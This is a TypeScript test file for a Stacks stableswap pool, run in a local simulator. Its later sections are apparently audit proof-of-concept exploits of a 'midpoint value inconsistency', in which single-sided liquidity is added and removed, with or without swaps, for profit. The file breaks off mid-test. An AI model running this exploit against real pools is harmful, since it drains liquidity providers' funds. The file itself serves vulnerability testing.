import { Cl, ClarityType, cvToJSON } from "@stacks/transactions";
import { initSimnet } from "@hirosystems/clarinet-sdk";
import { beforeAll, beforeEach, describe, expect, it, suite } from "vitest";

const simnet = await initSimnet();
const accounts = simnet.getAccounts();
const deployer = accounts.get("deployer")!;
const wallet1 = accounts.get("wallet_1")!;

describe("stableswap", () => {

    // Test configuration with adjusted parameters
    const INITIAL_BALANCE = 100000000; // 100M tokens
    const INITIAL_POOL_BALANCE = 10000000; // Increased to 10M for deeper liquidity
    const SWAP_AMOUNT = 1000; // Small swap of 1k tokens

    // Increased fees to make arbitrage harder
    const PROTOCOL_FEE = 30; // 0.3%
    const PROVIDER_FEE = 30; // 0.3%
    const LIQUIDITY_FEE = 40; // 0.4%
    // Total fees: 1% (100 bps)

    const AMP_COEFF = 100;
    // Currently 100 - this is a key parameter. 
    // Higher amplification = more stable prices
    // Higher values (like 200-500) would make the pool more "stable" around the intended price ratio, making arbitrage harder. 
    // Lower values would make the price more volatile and potentially increase arbitrage opportunities.

    const CONVERGENCE_THRESHOLD = 2;
    // Convergence threshold controls the precision of price calculations.
    // A smaller value means more precision, which means more accurate prices, but also means more computation.

    beforeEach(() => {

        // First mint some stSTX tokens to deployer
        simnet.callPublicFn(
            "token-ststx",
            "mint",
            [
                Cl.uint(INITIAL_POOL_BALANCE),
                Cl.principal(deployer)
            ],
            deployer
        );

        // Now create the pool
        const data = simnet.callPublicFn(
            "stableswap-core-v-1-1",
            "create-pool",
            [
                Cl.contractPrincipal(deployer, "stableswap-pool-stx-ststx-v-1-1"),
                Cl.contractPrincipal(deployer, "token-stx-v-1-1"),
                Cl.contractPrincipal(deployer, "token-ststx"),
                Cl.uint(INITIAL_POOL_BALANCE),
                Cl.uint(INITIAL_POOL_BALANCE),
                Cl.uint(PROTOCOL_FEE),
                Cl.uint(PROVIDER_FEE),
                Cl.uint(PROTOCOL_FEE),
                Cl.uint(PROVIDER_FEE),
                Cl.uint(LIQUIDITY_FEE),
                Cl.uint(AMP_COEFF),
                Cl.principal(wallet1),
                Cl.stringUtf8("stx-ststx-pool-v1"),
                Cl.bool(true)
            ],
            deployer
        );
        expect(data.result).toHaveClarityType(ClarityType.ResponseOk)

        const poolData = simnet.callReadOnlyFn(
            "stableswap-pool-stx-ststx-v-1-1",
            "get-pool",
            [],
            deployer
        );

        const data2 = cvToJSON(poolData.result).value.value
        expect(data2['pool-created'].value).toStrictEqual(true);
        expect(data2['pool-status'].value).toStrictEqual(true);
    });

    it("should have all required contracts deployed", () => {
        const contracts = [
            "sip-010-trait-ft-standard-v-1-1",
            "stableswap-pool-trait-v-1-1",
            "token-stx-v-1-1",
            "stableswap-core-v-1-1",
            "stableswap-pool-stx-ststx-v-1-1"
        ];

        contracts.forEach(contract => {
            expect(simnet.getContractSource(contract)).toBeDefined();
        });
    });


    it("should verify pool configuration", () => {
        const poolData = simnet.callReadOnlyFn(
            "stableswap-pool-stx-ststx-v-1-1",
            "get-pool",
            [],
            deployer
        );

        const data = cvToJSON(poolData.result).value.value
        console.log("Pool data:", data);

        expect(data['pool-created'].value).toStrictEqual(true);
        expect(data['pool-status'].value).toStrictEqual(true);
        expect(Number(data['x-protocol-fee'].value)).toStrictEqual(PROTOCOL_FEE);
        expect(Number(data['x-provider-fee'].value)).toStrictEqual(PROVIDER_FEE);
        expect(Number(data['y-protocol-fee'].value)).toStrictEqual(PROTOCOL_FEE);
        expect(Number(data['y-provider-fee'].value)).toStrictEqual(PROVIDER_FEE);
        expect(Number(data['liquidity-fee'].value)).toStrictEqual(LIQUIDITY_FEE);
        expect(Number(data['amplification-coefficient'].value)).toStrictEqual(AMP_COEFF);
        expect(Number(data['convergence-threshold'].value)).toStrictEqual(CONVERGENCE_THRESHOLD);
    });



    it("should add initial liquidity", () => {

        simnet.callPublicFn(
            "token-ststx",
            "mint",
            [
                Cl.uint(INITIAL_BALANCE),
                Cl.principal(deployer)
            ],
            deployer
        );

        // const assetsMap = simnet.getAssetsMap();
        // console.log("Assets map:", assetsMap);

        // Add liquidity
        const result = simnet.callPublicFn(
            "stableswap-core-v-1-1",
            "add-liquidity",
            [
                Cl.contractPrincipal(deployer, "stableswap-pool-stx-ststx-v-1-1"),
                Cl.contractPrincipal(deployer, "token-stx-v-1-1"),
                Cl.contractPrincipal(deployer, "token-ststx"),
                Cl.uint(INITIAL_BALANCE),
                Cl.uint(INITIAL_BALANCE),
                Cl.uint(1) // min LP tokens
            ],
            deployer
        );
        console.log("Liquidity added:", cvToJSON(result.result));
        expect(result.result).toHaveClarityType(ClarityType.ResponseOk);
    });

    it("should verify initial pool balances", () => {
        const poolData = simnet.callReadOnlyFn(
            "stableswap-pool-stx-ststx-v-1-1",
            "get-pool",
            [],
            deployer
        );

        const data = cvToJSON(poolData.result).value.value
        console.log("Pool data:", data);
        expect(poolData.result).toHaveClarityType(ClarityType.ResponseOk);
    });

    describe("2.1 Price Calculation", () => {
        it("should calculate correct swap amounts", () => {
            const result = simnet.callPublicFn(
                "stableswap-core-v-1-1",
                "get-dy",
                [
                    Cl.contractPrincipal(deployer, "stableswap-pool-stx-ststx-v-1-1"),
                    Cl.contractPrincipal(deployer, "token-stx-v-1-1"),
                    Cl.contractPrincipal(deployer, "token-ststx"),
                    Cl.uint(SWAP_AMOUNT)
                ],
                deployer
            );

            expect(result.result).toHaveClarityType(ClarityType.ResponseOk);
            const data = cvToJSON(result.result).value.value
            console.log("Swap result:", data);
        });
    });

    describe("2.2 Swapping", () => {

        beforeEach(() => {
            // Mint some stSTX tokens to deployer
            simnet.callPublicFn(
                "token-ststx",
                "mint",
                [
                    Cl.uint(INITIAL_BALANCE),
                    Cl.principal(deployer)
                ],
                deployer
            );
        })

        it("should swap STX for stSTX", () => {
            const result = simnet.callPublicFn(
                "stableswap-core-v-1-1",
                "swap-x-for-y",
                [
                    Cl.contractPrincipal(deployer, "stableswap-pool-stx-ststx-v-1-1"),
                    Cl.contractPrincipal(deployer, "token-stx-v-1-1"),
                    Cl.contractPrincipal(deployer, "token-ststx"),
                    Cl.uint(SWAP_AMOUNT),
                    Cl.uint(1) // min output amount
                ],
                deployer
            );

            const data = cvToJSON(result.result)
            console.log("Swap result:", data);
            expect(result.result).toHaveClarityType(ClarityType.ResponseOk);
        });

        it("should swap stSTX for STX", () => {
            const result = simnet.callPublicFn(
                "stableswap-core-v-1-1",
                "swap-y-for-x",
                [
                    Cl.contractPrincipal(deployer, "stableswap-pool-stx-ststx-v-1-1"),
                    Cl.contractPrincipal(deployer, "token-stx-v-1-1"),
                    Cl.contractPrincipal(deployer, "token-ststx"),
                    Cl.uint(SWAP_AMOUNT),
                    Cl.uint(1) // min output amount
                ],
                deployer
            );

            const data = cvToJSON(result.result)
            console.log("Swap result:", data);
            expect(result.result).toHaveClarityType(ClarityType.ResponseOk);
        });
    });

    // 2.3 Midpoint Value Inconsistency
    describe("2.3 Midpoint Value Inconsistency", () => {
        // Test configuration
        const INITIAL_BALANCE = 100000000; // 100M tokens
        const ARBITRAGE_AMOUNT = 1000000; // 1M tokens for arbitrage
        const STX_PRICE_USD = 1.00;  // $1.00 per STX
        const STSTX_PRICE_USD = 1.10; // $1.10 per stSTX
        const TOLERANCE = 0.001; // 0.1% tolerance

        const formatUSD = (amount: number) => `$${amount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;

        beforeEach(async () => {
            // Mint stSTX tokens to deployer for testing
            simnet.callPublicFn(
                "token-ststx",
                "mint",
                [
                    Cl.uint(INITIAL_BALANCE),
                    Cl.principal(deployer)
                ],
                deployer
            );
        });

        // Test 1: Demonstrate the arbitrage opportunity
        it("demonstrates arbitrage opportunity due to midpoint inconsistency", () => {
            console.log("\n=== Starting Arbitrage Demonstration ===");
            console.log(`STX Price: ${formatUSD(STX_PRICE_USD)}`);
            console.log(`stSTX Price: ${formatUSD(STSTX_PRICE_USD)}`);
            console.log(`Premium: ${((STSTX_PRICE_USD / STX_PRICE_USD - 1) * 100).toFixed(1)}%`);

            // Step 1: Add single-sided liquidity (STX only)
            console.log("\nStep 1: Adding single-sided STX liquidity");
            const initialInvestmentUSD = ARBITRAGE_AMOUNT * STX_PRICE_USD;
            console.log(`Initial investment: ${ARBITRAGE_AMOUNT} STX (${formatUSD(initialInvestmentUSD)})`);

            const addLiqResult = simnet.callPublicFn(
                "stableswap-core-v-1-1",
                "add-liquidity",
                [
                    Cl.contractPrincipal(deployer, "stableswap-pool-stx-ststx-v-1-1"),
                    Cl.contractPrincipal(deployer, "token-stx-v-1-1"),
                    Cl.contractPrincipal(deployer, "token-ststx"),
                    Cl.uint(ARBITRAGE_AMOUNT),
                    Cl.uint(0),
                    Cl.uint(1)
                ],
                deployer
            );
            const lpTokensReceived = Number(cvToJSON(addLiqResult.result).value.value);
            console.log(`LP tokens received: ${lpTokensReceived}`);
            console.log(`Note: LP tokens are priced assuming 1 STX = 1 stSTX`);

            // Step 2: Perform swap STX -> stSTX
            console.log("\nStep 2: Executing swap STX -> stSTX");
            const swapResult = simnet.callPublicFn(
                "stableswap-core-v-1-1",
                "swap-x-for-y",
                [
                    Cl.contractPrincipal(deployer, "stableswap-pool-stx-ststx-v-1-1"),
                    Cl.contractPrincipal(deployer, "token-stx-v-1-1"),
                    Cl.contractPrincipal(deployer, "token-ststx"),
                    Cl.uint(ARBITRAGE_AMOUNT),
                    Cl.uint(1)
                ],
                deployer
            );
            const swapOutput = Number(cvToJSON(swapResult.result).value.value);
            const swapValueUSD = swapOutput * STSTX_PRICE_USD;
            console.log(`Swapped ${ARBITRAGE_AMOUNT} STX for ${swapOutput} stSTX`);
            console.log(`Swap value: ${formatUSD(swapValueUSD)}`);

            // Step 3: Remove liquidity
            console.log("\nStep 3: Removing liquidity");
            const removeLiqResult = simnet.callPublicFn(
                "stableswap-core-v-1-1",
                "withdraw-liquidity",
                [
                    Cl.contractPrincipal(deployer, "stableswap-pool-stx-ststx-v-1-1"),
                    Cl.contractPrincipal(deployer, "token-stx-v-1-1"),
                    Cl.contractPrincipal(deployer, "token-ststx"),
                    Cl.uint(lpTokensReceived),
                    Cl.uint(1),
                    Cl.uint(1)
                ],
                deployer
            );
            const withdrawAmount = cvToJSON(removeLiqResult.result).value.value;
            const finalSTX = Number(withdrawAmount['x-amount'].value);
            const finalStSTX = Number(withdrawAmount['y-amount'].value) + swapOutput;

            const finalValueUSD = (finalSTX * STX_PRICE_USD) + (finalStSTX * STSTX_PRICE_USD);
            const profitUSD = finalValueUSD - initialInvestmentUSD;
            const profitPercent = (profitUSD / initialInvestmentUSD) * 100;

            console.log("\n=== Arbitrage Summary ===");
            console.log(`Initial investment: ${formatUSD(initialInvestmentUSD)}`);
            console.log(`Final position value: ${formatUSD(finalValueUSD)}`);
            console.log(`Profit: ${formatUSD(profitUSD)} (${profitPercent.toFixed(2)}%)`);
            console.log("\nBreakdown of final position:");
            console.log(`STX: ${finalSTX} (${formatUSD(finalSTX * STX_PRICE_USD)})`);
            console.log(`stSTX: ${finalStSTX} (${formatUSD(finalStSTX * STSTX_PRICE_USD)})`);
        });

        // Test 2: Verify no arbitrage exists (this should fail given the vulnerability)
        it("should NOT allow profitable arbitrage due to midpoint inconsistency (expected to fail)", () => {
            console.log("\n=== Starting Arbitrage Prevention Test ===");
            console.log(`STX Price: ${formatUSD(STX_PRICE_USD)}`);
            console.log(`stSTX Price: ${formatUSD(STSTX_PRICE_USD)}`);

            // Track initial value
            const initialValueUSD = ARBITRAGE_AMOUNT * STX_PRICE_USD;
            console.log(`Initial investment: ${formatUSD(initialValueUSD)}`);

            // Step 1: Add liquidity
            const addLiqResult = simnet.callPublicFn(
                "stableswap-core-v-1-1",
                "add-liquidity",
                [
                    Cl.contractPrincipal(deployer, "stableswap-pool-stx-ststx-v-1-1"),
                    Cl.contractPrincipal(deployer, "token-stx-v-1-1"),
                    Cl.contractPrincipal(deployer, "token-ststx"),
                    Cl.uint(ARBITRAGE_AMOUNT),
                    Cl.uint(0),
                    Cl.uint(1)
                ],
                deployer
            );
            const lpTokensReceived = Number(cvToJSON(addLiqResult.result).value.value);

            // Step 2: Perform swap
            const swapResult = simnet.callPublicFn(
                "stableswap-core-v-1-1",
                "swap-x-for-y",
                [
                    Cl.contractPrincipal(deployer, "stableswap-pool-stx-ststx-v-1-1"),
                    Cl.contractPrincipal(deployer, "token-stx-v-1-1"),
                    Cl.contractPrincipal(deployer, "token-ststx"),
                    Cl.uint(ARBITRAGE_AMOUNT),
                    Cl.uint(1)
                ],
                deployer
            );
            const swapOutput = Number(cvToJSON(swapResult.result).value.value);

            // Step 3: Remove liquidity
            const removeLiqResult = simnet.callPublicFn(
                "stableswap-core-v-1-1",
                "withdraw-liquidity",
                [
                    Cl.contractPrincipal(deployer, "stableswap-pool-stx-ststx-v-1-1"),
                    Cl.contractPrincipal(deployer, "token-stx-v-1-1"),
                    Cl.contractPrincipal(deployer, "token-ststx"),
                    Cl.uint(lpTokensReceived),
                    Cl.uint(1),
                    Cl.uint(1)
                ],
                deployer
            );
            const withdrawAmount = cvToJSON(removeLiqResult.result).value.value;
            const finalSTX = Number(withdrawAmount['x-amount'].value);
            const finalStSTX = Number(withdrawAmount['y-amount'].value) + swapOutput;

            // Calculate final value and profit
            const finalValueUSD = (finalSTX * STX_PRICE_USD) + (finalStSTX * STSTX_PRICE_USD);
            const profitUSD = finalValueUSD - initialValueUSD;
            const profitPercent = (profitUSD / initialValueUSD) * 100;

            console.log("\n=== Final Position Analysis ===");
            console.log(`Initial value: ${formatUSD(initialValueUSD)}`);
            console.log(`Final value: ${formatUSD(finalValueUSD)}`);
            console.log(`Profit/Loss: ${formatUSD(profitUSD)} (${profitPercent.toFixed(2)}%)`);

            // This assertion should fail due to the vulnerability
            expect(profitPercent).toBeLessThanOrEqual(TOLERANCE * 100);
            console.log(`\nTest ${profitPercent <= TOLERANCE * 100 ? 'PASSED ✅' : 'FAILED ❌'}`);
            console.log(`Profit exceeds ${TOLERANCE * 100}% tolerance`);
        });
    });

    describe("2.4 Midpoint Value Inconsistency p2", () => {
        // Test configuration with adjusted parameters
        const INITIAL_BALANCE = 100000000; // 100M tokens
        const INITIAL_POOL_BALANCE = 10000000; // Increased to 10M for deeper liquidity
        const ARBITRAGE_AMOUNT = 1000000; // 1M tokens for arbitrage
        const STX_PRICE_USD = 1.00;  // $1.00 per STX
        const STSTX_PRICE_USD = 1.10; // $1.10 per stSTX

        // Increased fees to make arbitrage harder
        const PROTOCOL_FEE = 30; // 0.3%
        const PROVIDER_FEE = 30; // 0.3%
        const LIQUIDITY_FEE = 40; // 0.4%
        // Total fees: 1% (100 bps)

        // Increased amplification coefficient for more stable prices
        const AMP_COEFF = 300; // Higher amplification = more stable prices

        const formatUSD = (amount: number) => `$${amount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;

        beforeEach(async () => {
            // Mint stSTX tokens to deployer for testing
            simnet.callPublicFn(
                "token-ststx",
                "mint",
                [
                    Cl.uint(INITIAL_BALANCE),
                    Cl.principal(deployer)
                ],
                deployer
            );

            // Initialize pool with larger initial liquidity
            simnet.callPublicFn(
                "stableswap-core-v-1-1",
                "create-pool",
                [
                    Cl.contractPrincipal(deployer, "stableswap-pool-stx-ststx-v-1-1"),
                    Cl.contractPrincipal(deployer, "token-stx-v-1-1"),
                    Cl.contractPrincipal(deployer, "token-ststx"),
                    Cl.uint(INITIAL_POOL_BALANCE),
                    Cl.uint(INITIAL_POOL_BALANCE),
                    Cl.uint(PROTOCOL_FEE),
                    Cl.uint(PROVIDER_FEE),
                    Cl.uint(PROTOCOL_FEE),
                    Cl.uint(PROVIDER_FEE),
                    Cl.uint(LIQUIDITY_FEE),
                    Cl.uint(AMP_COEFF),
                    Cl.principal(wallet1),
                    Cl.stringUtf8("stx-ststx-pool-v1"),
                    Cl.bool(true)
                ],
                deployer
            );
        });

        // Rest of the test code remains the same...
        // [Previous test implementation continues here]

        it("should show reduced arbitrage with higher fees and amplification", () => {
            console.log("\n=== Testing Arbitrage with Modified Parameters ===");
            console.log("Pool Parameters:");
            console.log(`- Initial Pool Balance: ${INITIAL_POOL_BALANCE} tokens`);
            console.log(`- Total Fees: ${(PROTOCOL_FEE + PROVIDER_FEE + LIQUIDITY_FEE) / 100}%`);
            console.log(`- Amplification Coefficient: ${AMP_COEFF}`);
            console.log(`- Price Premium: ${((STSTX_PRICE_USD / STX_PRICE_USD - 1) * 100).toFixed(1)}%`);

            // Get initial pool state
            const initialPool = simnet.callReadOnlyFn(
                "stableswap-pool-stx-ststx-v-1-1",
                "get-pool",
                [],
                deployer
            );
            const initialData = cvToJSON(initialPool.result).value.value;

            // Step 1: Add single-sided liquidity (STX only)
            const initialInvestmentUSD = ARBITRAGE_AMOUNT * STX_PRICE_USD;
            console.log(`\nStep 1: Adding ${formatUSD(initialInvestmentUSD)} worth of STX`);

            const addLiqResult = simnet.callPublicFn(
                "stableswap-core-v-1-1",
                "add-liquidity",
                [
                    Cl.contractPrincipal(deployer, "stableswap-pool-stx-ststx-v-1-1"),
                    Cl.contractPrincipal(deployer, "token-stx-v-1-1"),
                    Cl.contractPrincipal(deployer, "token-ststx"),
                    Cl.uint(ARBITRAGE_AMOUNT),
                    Cl.uint(0),
                    Cl.uint(1)
                ],
                deployer
            );
            const lpTokensReceived = Number(cvToJSON(addLiqResult.result).value.value);

            // Step 2: Calculate optimal swap amount (reduced due to higher fees)
            const swapAmount = Math.floor(ARBITRAGE_AMOUNT * 0.5); // Reduce swap size due to higher fees
            const swapResult = simnet.callPublicFn(
                "stableswap-core-v-1-1",
                "swap-x-for-y",
                [
                    Cl.contractPrincipal(deployer, "stableswap-pool-stx-ststx-v-1-1"),
                    Cl.contractPrincipal(deployer, "token-stx-v-1-1"),
                    Cl.contractPrincipal(deployer, "token-ststx"),
                    Cl.uint(swapAmount),
                    Cl.uint(1)
                ],
                deployer
            );
            const swapOutput = Number(cvToJSON(swapResult.result).value.value);

            // Step 3: Remove liquidity
            const removeLiqResult = simnet.callPublicFn(
                "stableswap-core-v-1-1",
                "withdraw-liquidity",
                [
                    Cl.contractPrincipal(deployer, "stableswap-pool-stx-ststx-v-1-1"),
                    Cl.contractPrincipal(deployer, "token-stx-v-1-1"),
                    Cl.contractPrincipal(deployer, "token-ststx"),
                    Cl.uint(lpTokensReceived),
                    Cl.uint(1),
                    Cl.uint(1)
                ],
                deployer
            );
            const withdrawAmount = cvToJSON(removeLiqResult.result).value.value;
            const finalSTX = Number(withdrawAmount['x-amount'].value);
            const finalStSTX = Number(withdrawAmount['y-amount'].value) + swapOutput;

            // Calculate profits with higher fees
            const finalValueUSD = (finalSTX * STX_PRICE_USD) + (finalStSTX * STSTX_PRICE_USD);
            const profitUSD = finalValueUSD - initialInvestmentUSD;
            const profitPercent = (profitUSD / initialInvestmentUSD) * 100;

            console.log("\n=== Arbitrage Results with Modified Parameters ===");
            console.log(`Initial investment: ${formatUSD(initialInvestmentUSD)}`);
            console.log(`Final value: ${formatUSD(finalValueUSD)}`);
            console.log(`Profit/Loss: ${formatUSD(profitUSD)} (${profitPercent.toFixed(2)}%)`);
            console.log(`\nImpact of Changes:`);
            console.log(`- Higher fees reduced profit by ~${((PROTOCOL_FEE + PROVIDER_FEE + LIQUIDITY_FEE) / 100).toFixed(1)}%`);
            console.log(`- Deeper liquidity reduced price impact`);
            console.log(`- Higher amp coefficient made prices more stable`);
        });
    });

    describe("2.5 Simpler Midpoint Value Exploit", () => {
        const INITIAL_BALANCE = 100000000; // 100M tokens
        const EXPLOIT_AMOUNT = 1000000; // 1M tokens
        const STX_PRICE_USD = 1.00;  // $1.00 per STX
        const STSTX_PRICE_USD = 1.10; // $1.10 per stSTX

        const formatUSD = (amount: number) => `$${amount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;

        beforeEach(async () => {
            // Mint stSTX tokens to deployer for testing
            simnet.callPublicFn(
                "token-ststx",
                "mint",
                [
                    Cl.uint(INITIAL_BALANCE),
                    Cl.principal(deployer)
                ],
                deployer
            );
        });

        it("demonstrates simple add/remove liquidity exploit", () => {
            console.log("\n=== Starting Simple Exploit Demonstration ===");
            console.log(`STX Price: ${formatUSD(STX_PRICE_USD)}`);
            console.log(`stSTX Price: ${formatUSD(STSTX_PRICE_USD)}`);
            console.log(`Premium: ${((STSTX_PRICE_USD / STX_PRICE_USD - 1) * 100).toFixed(1)}%`);

            // Step 1: Add single-sided liquidity (STX only)
            console.log("\nStep 1: Adding single-sided STX liquidity");
            const initialInvestmentUSD = EXPLOIT_AMOUNT * STX_PRICE_USD;
            console.log(`Initial investment: ${EXPLOIT_AMOUNT} STX (${formatUSD(initialInvestmentUSD)})`);

            const addLiqResult = simnet.callPublicFn(
                "stableswap-core-v-1-1",
                "add-liquidity",
                [
                    Cl.contractPrincipal(deployer, "stableswap-pool-stx-ststx-v-1-1"),
                    Cl.contractPrincipal(deployer, "token-stx-v-1-1"),
                    Cl.contractPrincipal(deployer, "token-ststx"),
                    Cl.uint(EXPLOIT_AMOUNT),
                    Cl.uint(0),
                    Cl.uint(1)
                ],
                deployer
            );
            const lpTokensReceived = Number(cvToJSON(addLiqResult.result).value.value);
            console.log(`LP tokens received: ${lpTokensReceived}`);
            console.log(`Note: LP tokens are priced assuming 1 STX = 1 stSTX`);

            // Step 2: Immediately remove liquidity
            console.log("\nStep 2: Immediately removing liquidity");
            const removeLiqResult = simnet.callPublicFn(
                "stableswap-core-v-1-1",
                "withdraw-liquidity",
                [
                    Cl.contractPrincipal(deployer, "stableswap-pool-stx-ststx-v-1-1"),
                    Cl.contractPrincipal(deployer, "token-stx-v-1-1"),
                    Cl.contractPrincipal(deployer, "token-ststx"),
                    Cl.uint(lpTokensReceived),
                    Cl.uint(1),
                    Cl.uint(1)
                ],
                deployer
            );
            const withdrawAmount = cvToJSON(removeLiqResult.result).value.value;
            const finalSTX = Number(withdrawAmount['x-amount'].value);
            const finalStSTX = Number(withdrawAmount['y-amount'].value);

            // Calculate profit
            const finalValueUSD = (finalSTX * STX_PRICE_USD) + (finalStSTX * STSTX_PRICE_USD);
            const profitUSD = finalValueUSD - initialInvestmentUSD;
            const profitPercent = (profitUSD / initialInvestmentUSD) * 100;

            console.log("\n=== Simple Exploit Summary ===");
            console.log(`Initial investment: ${formatUSD(initialInvestmentUSD)}`);
            console.log(`Final position value: ${formatUSD(finalValueUSD)}`);
            console.log(`Profit: ${formatUSD(profitUSD)} (${profitPercent.toFixed(2)}%)`);
            console.log("\nBreakdown of final position:");
            console.log(`STX: ${finalSTX} (${formatUSD(finalSTX * STX_PRICE_USD)})`);
            console.log(`stSTX: ${finalStSTX} (${formatUSD(finalStSTX * STSTX_PRICE_USD)})`);

            console.log("\nExplanation:");
            console.log("1. We put in only STX");
            console.log("2. Pool gave us LP tokens as if STX = stSTX");
            console.log("3. We burned LP tokens and got both tokens back");
            console.log("4. But stSTX is worth more, so we profited!");
        });
    });

    describe("2.6 Compound Midpoint Value Exploit", () => {
        const INITIAL_BALANCE = 100000000; // 100M tokens
        const EXPLOIT_AMOUNT = 1000000; // 1M tokens
        const STX_PRICE_USD = 1.00;  // $1.00 per STX
        const STSTX_PRICE_USD = 1.10; // $1.10 per stSTX
        const CYCLES = 5;

        const formatUSD = (amount: number) => `$${amount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;

        beforeEach(async () => {
            // Mint stSTX tokens to deployer for testing
            simnet.callPublicFn(
                "token-ststx",
                "mint",
                [
                    Cl.uint(INITIAL_BALANCE),
                    Cl.principal(deployer)
                ],
                deployer
            );
        });

        it(`demonstrates compound exploit over ${CYCLES} cycles`, () => {
            console.log("\n=== Starting Compound Exploit Demonstration ===");
            console.log(`STX Price: ${formatUSD(STX_PRICE_USD)}`);
            console.log(`stSTX Price: ${formatUSD(STSTX_PRICE_USD)}`);
            console.log(`Premium: ${((STSTX_PRICE_USD / STX_PRICE_USD - 1) * 100).toFixed(1)}%`);
            console.log(`Initial STX: ${EXPLOIT_AMOUNT}`);

            let currentSTXBalance = EXPLOIT_AMOUNT;
            let totalProfit = 0;

            for (let cycle = 1; cycle <= CYCLES; cycle++) {
                console.log(`\n=== Cycle ${cycle} ===`);
                console.log(`Starting STX balance: ${currentSTXBalance}`);

                // Step 1: Add single-sided liquidity (STX only)
                const addLiqResult = simnet.callPublicFn(
                    "stableswap-core-v-1-1",
                    "add-liquidity",
                    [
                        Cl.contractPrincipal(deployer, "stableswap-pool-stx-ststx-v-1-1"),
                        Cl.contractPrincipal(deployer, "token-stx-v-1-1"),
                        Cl.contractPrincipal(deployer, "token-ststx"),
                        Cl.uint(currentSTXBalance),
                        Cl.uint(0),
                        Cl.uint(1)
                    ],
                    deployer
                );
                const lpTokensReceived = Number(cvToJSON(addLiqResult.result).value.value);
                console.log(`LP tokens received: ${lpTokensReceived}`);

                // Step 2: Remove liquidity
                const removeLiqResult = simnet.callPublicFn(
                    "stableswap-core-v-1-1",
                    "withdraw-liquidity",
                    [
                        Cl.contractPrincipal(deployer, "stableswap-pool-stx-ststx-v-1-1"),
                        Cl.contractPrincipal(deployer, "token-stx-v-1-1"),
                        Cl.contractPrincipal(deployer, "token-ststx"),
                        Cl.uint(lpTokensReceived),
                        Cl.uint(1),
                        Cl.uint(1)
                    ],
                    deployer
                );
                const withdrawAmount = cvToJSON(removeLiqResult.result).value.value;
                const receivedSTX = Number(withdrawAmount['x-amount'].value);
                const receivedStSTX = Number(withdrawAmount['y-amount'].value);

                console.log(`Received from withdrawal:`);
                console.log(`- STX: ${receivedSTX}`);
                console.log(`- stSTX: ${receivedStSTX}`);

                // Step 3: Swap stSTX back to STX
                if (receivedStSTX > 0) {
                    const swapResult = simnet.callPublicFn(
                        "stableswap-core-v-1-1",
                        "swap-y-for-x",
                        [
                            Cl.contractPrincipal(deployer, "stableswap-pool-stx-ststx-v-1-1"),
                            Cl.contractPrincipal(deployer, "token-stx-v-1-1"),
                            Cl.contractPrincipal(deployer, "token-ststx"),
                            Cl.uint(receivedStSTX),
                            Cl.uint(1)
                        ],
                        deployer
                    );
                    const swapOutput = Number(cvToJSON(swapResult.result).value.value);
                    console.log(`Swapped ${receivedStSTX} stSTX for ${swapOutput} STX`);

                    // Update STX balance
                    currentSTXBalance = receivedSTX + swapOutput;
                }

                // Calculate cycle profit
                const cycleProfit = currentSTXBalance - (cycle === 1 ? EXPLOIT_AMOUNT : totalProfit + EXPLOIT_AMOUNT);
                totalProfit += cycleProfit;

                console.log(`\nCycle ${cycle} Summary:`);
                console.log(`New STX balance: ${currentSTXBalance}`);
                console.log(`Cycle profit: ${cycleProfit} STX (${formatUSD(cycleProfit * STX_PRICE_USD)})`);
                console.log(`Running total profit: ${totalProfit} STX (${formatUSD(totalProfit * STX_PRICE_USD)})`);
                console.log(`Return so far: ${((totalProfit / EXPLOIT_AMOUNT) * 100).toFixed(2)}%`);
            }

            console.log("\n=== Final Compound Exploit Summary ===");
            console.log(`Initial investment: ${EXPLOIT_AMOUNT} STX (${formatUSD(EXPLOIT_AMOUNT * STX_PRICE_USD)})`);
            console.log(`Final balance: ${currentSTXBalance} STX (${formatUSD(currentSTXBalance * STX_PRICE_USD)})`);
            console.log(`Total profit: ${totalProfit} STX (${formatUSD(totalProfit * STX_PRICE_USD)})`);
            console.log(`Total return: ${((totalProfit / EXPLOIT_AMOUNT) * 100).toFixed(2)}%`);
            console.log(`\nAverage profit per cycle: ${(totalProfit / CYCLES)} STX (${formatUSD((totalProfit / CYCLES) * STX_PRICE_USD)})`);
        });
    });

    describe("2.7 Exploit Approach Comparison", () => {
        const INITIAL_BALANCE = 100000000; // 100M tokens
        const EXPLOIT_AMOUNT = 1000000; // 1M tokens
        const STX_PRICE_USD = 1.00;
        const STSTX_PRICE_USD = 1.10;

        const formatUSD = (amount: number) => `$${amount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;

        beforeEach(async () => {
            // Mint stSTX tokens to deployer
            simnet.callPublicFn(
                "token-ststx",
                "mint",
                [
                    Cl.uint(INITIAL_BALANCE),
                    Cl.principal(deployer)
                ],
                deployer
            );
        });

        it("compares different exploit approaches", () => {
            console.log("\n=== Exploit Strategy Comparison ===");

            // Approach 1: Simple add/remove
            console.log("\n1. Simple Add/Remove Approach");
            const addLiqResult1 = simnet.callPublicFn(
                "stableswap-core-v-1-1",
                "add-liquidity",
                [
                    Cl.contractPrincipal(deployer, "stableswap-pool-stx-ststx-v-1-1"),
                    Cl.contractPrincipal(deployer, "token-stx-v-1-1"),
                    Cl.contractPrincipal(deployer, "token-ststx"),
                    Cl.uint(EXPLOIT_AMOUNT),
                    Cl.uint(0),
                    Cl.uint(1)
                ],
                deployer
            );
            const lpTokens1 = Number(cvToJSON(addLiqResult1.result).value.value);

            const removeLiqResult1 = simnet.callPublicFn(
                "stableswap-core-v-1-1",
                "withdraw-liquidity",
                [
                    Cl.contractPrincipal(deployer, "stableswap-pool-stx-ststx-v-1-1"),
                    Cl.contractPrincipal(deployer, "token-stx-v-1-1"),
                    Cl.contractPrincipal(deployer, "token-ststx"),
                    Cl.uint(lpTokens1),
                    Cl.uint(1),
                    Cl.uint(1)
                ],
                deployer
            );
            const withdraw1 = cvToJSON(removeLiqResult1.result).value.value;
            const finalSTX1 = Number(withdraw1['x-amount'].value);
            const finalStSTX1 = Number(withdraw1['y-amount'].value);
            const value1 = (finalSTX1 * STX_PRICE_USD) + (finalStSTX1 * STSTX_PRICE_USD);

            console.log(`Initial: ${EXPLOIT_AMOUNT} STX (${formatUSD(EXPLOIT_AMOUNT)})`);
            console.log(`Received: ${finalSTX1} STX + ${finalStSTX1} stSTX`);
